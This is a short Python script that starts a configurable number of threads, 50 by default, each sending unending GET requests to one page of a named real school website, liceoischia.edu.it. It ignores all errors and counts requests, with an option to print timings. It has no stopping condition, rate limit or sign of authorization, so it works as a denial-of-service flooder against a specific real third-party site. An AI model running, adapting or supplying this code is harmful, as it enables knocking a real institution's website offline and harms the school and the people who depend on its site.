import requests, threading, time, os

I=0
nThreads = int(os.environ.get("THREADS", "50"))
TIMEOUT = int(os.environ.get("TIMEOUT", "20"))
hv = os.environ.get("HEAVYPRINT", "false")

threads = []

print(f"Starting {nThreads} threads with {TIMEOUT} seconds of timeout")

def do_request():
    global I
    while True:
        t1 = time.time()
        try:
            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=TIMEOUT)
        except:
            pass
        I=I+1
        print(f'Req n:{I} took: {time.time() - t1} s')

def do_request_nhv():
    global I
    while True:
        try:
            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=TIMEOUT)
        except:
            pass
        I=I+1

for _ in range(nThreads):
    if hv == "true":
        t = threading.Thread(target=do_request)
    else:
        t = threading.Thread(target=do_request_nhv)
    t.daemon = True
    threads.append(t)

for y in range(nThreads):
    threads[y].start()

for y in range(nThreads):
    threads[y].join()